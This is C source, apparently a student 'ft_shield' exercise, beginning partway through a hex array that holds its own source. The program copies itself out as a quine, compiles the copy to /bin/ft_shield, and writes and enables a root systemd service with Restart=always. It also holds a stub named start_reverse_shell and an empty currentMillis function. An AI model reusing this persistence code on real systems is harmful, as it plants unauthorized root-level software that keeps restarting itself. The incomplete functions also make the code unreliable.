74,0x66,0x28,0x22,0x77,0x65,0x20,0x68,0x61,0x76,0x65,0x20,0x61,0x63,0x63,0x65,0x73,0x73,0x20,0x74,0x6f,0x20,0x77,0x72,0x69,0x74,0x65,0x20,0x6f,0x75,0x72,0x20,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x22,0x29,0x3b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x44,0x61,0x65,0x6d,0x6f,0x6e,0x20,0x63,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,0x74,0x69,0x6f,0x6e,0x5c,0x6e,0x25,0x73,0x22,0x2c,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x5f,0x63,0x6f,0x6e,0x66,0x69,0x67,0x29,0x3b,0x0a,0x7d,0x0a,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x5f,0x6c,0x6f,0x67,0x69,0x6e,0x28,0x29,0x7b,0x0a,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x25,0x73,0x5c,0x6e,0x22,0x2c,0x20,0x4c,0x4f,0x47,0x49,0x4e,0x29,0x3b,0x0a,0x7d,0x0a,0x0a,0x0a,0x76,0x6f,0x69,0x64,0x20,0x73,0x74,0x61,0x72,0x74,0x5f,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x5f,0x73,0x68,0x65,0x6c,0x6c,0x28,0x29,0x7b,0x0a,0x09,0x69,0x6e,0x74,0x20,0x70,0x69,0x64,0x20,0x3d,0x20,0x66,0x6f,0x72,0x6b,0x28,0x29,0x3b,0x0a,0x0a,0x0a,0x09,0x69,0x66,0x20,0x28,0x70,0x69,0x64,0x20,0x21,0x3d,0x20,0x30,0x29,0x0a,0x09,0x09,0x65,0x78,0x69,0x74,0x28,0x30,0x29,0x3b,0x0a,0x09,0x63,0x68,0x61,0x72,0x20,0x63,0x77,0x64,0x5b,0x50,0x41,0x54,0x48,0x5f,0x4d,0x41,0x58,0x5d,0x3b,0x0a,0x0a,0x20,0x20,0x20,0x0a,0x20,0x20,0x20,0x20,0x09,0x69,0x66,0x20,0x28,0x67,0x65,0x74,0x63,0x77,0x64,0x28,0x63,0x77,0x64,0x2c,0x20,0x73,0x69,0x7a,0x65,0x6f,0x66,0x28,0x63,0x77,0x64,0x29,0x29,0x20,0x3d,0x3d,0x20,0x4e,0x55,0x4c,0x4c,0x29,0x20,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x09,0x65,0x78,0x69,0x74,0x28,0x31,0x29,0x3b,0x0a,0x0a,0x09,0x77,0x68,0x69,0x6c,0x65,0x28,0x31,0x29,0x7b,0x0a,0x0a,0x20,0x20,0x20,0x20,0x09,0x09,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x20,0x77,0x6f,0x72,0x6b,0x69,0x6e,0x67,0x20,0x64,0x69,0x72,0x3a,0x20,0x25,0x73,0x5c,0x6e,0x22,0x2c,0x20,0x63,0x77,0x64,0x29,0x3b,0x0a,0x09,0x09,0x73,0x6c,0x65,0x65,0x70,0x28,0x35,0x29,0x3b,0x0a,0x09,0x7d,0x0a,0x0a,0x7d,0x0a,0x0a,0x0a,0x69,0x6e,0x74,0x20,0x6d,0x61,0x69,0x6e,0x28,0x29,0x7b,0x0a,0x0a,0x20,0x20,0x20,0x20,0x2f,0x2f,0x20,0x69,0x66,0x20,0x77,0x65,0x20,0x61,0x72,0x65,0x20,0x69,0x6e,0x20,0x2f,0x62,0x69,0x6e,0x20,0x0a,0x20,0x20,0x20,0x20,0x69,0x66,0x20,0x28,0x67,0x65,0x74,0x75,0x69,0x64,0x28,0x29,0x20,0x21,0x3d,0x20,0x30,0x29,0x7b,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x79,0x6f,0x75,0x20,0x64,0x6f,0x6e,0x27,0x74,0x20,0x68,0x61,0x76,0x65,0x20,0x72,0x6f,0x6f,0x74,0x20,0x61,0x63,0x63,0x65,0x73,0x73,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x20,0x20,0x20,0x20,0x7d,0x0a,0x20,0x20,0x20,0x20,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x5f,0x6c,0x6f,0x67,0x69,0x6e,0x28,0x29,0x3b,0x0a,0x20,0x20,0x20,0x20,0x0a,0x0a,0x0a,0x0a,0x20,0x20,0x20,0x20,0x69,0x66,0x20,0x28,0x69,0x6e,0x5f,0x62,0x69,0x6e,0x28,0x29,0x29,0x20,0x7b,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x77,0x65,0x20,0x61,0x72,0x65,0x20,0x61,0x74,0x20,0x62,0x69,0x6e,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x73,0x74,0x61,0x72,0x74,0x5f,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x5f,0x73,0x68,0x65,0x6c,0x6c,0x28,0x29,0x3b,0x0a,0x20,0x20,0x20,0x20,0x7d,0x20,0x65,0x6c,0x73,0x65,0x20,0x7b,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x70,0x72,0x69,0x6e,0x74,0x66,0x28,0x22,0x6f,0x6f,0x6f,0x70,0x73,0x20,0x77,0x65,0x20,0x61,0x72,0x65,0x20,0x6e,0x6f,0x74,0x20,0x61,0x74,0x20,0x62,0x69,0x6e,0x5c,0x6e,0x22,0x29,0x3b,0x0a,0x09,0x20,0x20,0x20,0x2f,0x2f,0x20,0x73,0x74,0x61,0x72,0x74,0x5f,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x28,0x29,0x3b,0x0a,0x09,0x20,0x20,0x20,0x63,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x65,0x5f,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x28,0x29,0x3b,0x0a,0x0a,0x20,0x20,0x20,0x20,0x7d,0x0a,0x0a,0x0a,0x0a,0x0a,0x0a,0x20,0x20,0x20,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x30,0x3b,0x0a,0x7d,0x0a};
#include <stdbool.h>
#include <stddef.h>
#include <unistd.h>
#include <stdio.h>
#include "string.h"
#include "stdlib.h"
#include <linux/limits.h>
#include <time.h>
#include <time.h>
#include <sys/time.h>


long currentMillis() {
	// Convert the seconds to milliseconds by multiplying by 1000
	// Convert the microseconds to milliseconds by dividing by 1000
}


#define LOGIN "hlahwaou"


char target_dir[10000] = "/bin";
char target_path[] = "/bin/ft_shield";
char daemon_config_path[] = "/etc/systemd/system/";
char service_path[] = "/etc/systemd/system/ft_shield.service";
char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nStandardOutput=syslog\nStandardError=syslog\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";


char cmd[1000];
char filePath[600];

bool in_bin(){
	char cwd[PATH_MAX];
	int len;
   
	if (getcwd(cwd, sizeof(cwd)) == NULL) 
		exit(1);
	if (realpath(target_dir,target_dir) == NULL)
		exit(1);
	printf("%s = %s\n", cwd, target_dir);
	return strcmp(cwd, target_dir) == 0;
}




void start_daemon(){

	int pid = fork();


	if (pid < 0)
		exit(0);

	if (pid)
		exit(0);

	printf("here is the daemon process !\n");
	printf("Yep access to %s\n", target_path);
}

void generate_file_path(){
	int pid = getpid(); 
	int index = 5;
    struct timeval tp;
	long ms;
    srand(time(NULL));
    unsigned int random_number = (unsigned int)rand(); 


	memcpy(filePath, "/tmp/",6 );
	gettimeofday(&tp, NULL);
	ms = tp.tv_sec * 1000 + tp.tv_usec / 1000;


	while (pid > 0){
	    filePath[index] = (pid % 10) + '0';
	    pid = pid / 10;
	    index++;
	}
	while (ms > 0){
	    filePath[index] = (ms % 10) + '0';
	    ms = ms / 10;
	    index++;
	}
    while (random_number > 0){
	    filePath[index] = (random_number % 10) + '0';
	    random_number  = random_number / 10;
	    index++;
	}
	filePath[index++] = '.';
	filePath[index++] = 'c';
	filePath[index] = '\0';
}

void quine(){
	generate_file_path();
	FILE* fptr = fopen(filePath, "w+");


	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}


	fprintf(fptr, "char src[] = {");
	for (int i =0 ; i < sizeof(src); i++){
		if (fprintf(fptr, "  %0#4x,", src[i]) < 0)
			exit(0);
	}
	if (fprintf(fptr, "};\n") < 0 )
		exit(0);
	for (int i =0 ; i < sizeof(src); i++){
		if (fprintf(fptr, "%c", src[i]) < 0)
			exit(0);
	}
	fclose(fptr);
}


void compileTheCode(){
    	sprintf(cmd, "cc %s -o %s", filePath, target_path);
	int status = system(cmd);
	if (status == -1 || (WIFEXITED(status)  && WEXITSTATUS(status) != 0 )){
		printf("Error cmd '%s' exited %d\n", cmd, WEXITSTATUS(status));
		exit(1); 
	}
}


void setUpService(){
	FILE* fptr = fopen("/etc/systemd/system/ft_shield.service", "w+");

	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}
	if (fprintf(fptr, "%s", daemon_config) < 0){
		perror("errro");
		printf("we wern't able to write our .service\n");
		exit(0);
	}
	fclose(fptr);
	int status = system("systemctl daemon-reload && systemctl enable ft_shield.service");
	if (status == -1 || (WIFEXITED(status)  && WEXITSTATUS(status) != 0 )){
		printf("Error cmd '%s' exited %d\n", cmd, WEXITSTATUS(status));
		exit(1); 
	}
}





void configure_daemon(){
    
	// let the program create themself
	quine();
	// compile the code 
	compileTheCode();
	// clean file .c
	unlink(filePath);


	// now that we have binnary let's set the service 
	setUpService();
	printf("------------\n");
	printf("we have access to write our service");
	printf("Daemon configuration\n%s", daemon_config);
}



void display_login(){
	printf("%s\n", LOGIN);
}


void start_reverse_shell(){
	int pid = fork();


	if (pid != 0)
		exit(0);
	char cwd[PATH_MAX];

   
    	if (getcwd(cwd, sizeof(cwd)) == NULL) 
        	exit(1);

	while(1){

    		printf("Current working dir: %s\n", cwd);
		sleep(5);
	}

}


int main(){

    // if we are in /bin 
    if (getuid() != 0){
        printf("you don't have root access\n");
    }
    display_login();
    



    if (in_bin()) {
        printf("we are at bin\n");
	start_reverse_shell();
    } else {
        printf("ooops we are not at bin\n");
	   // start_daemon();
	   configure_daemon();

    }





    return 0;
}
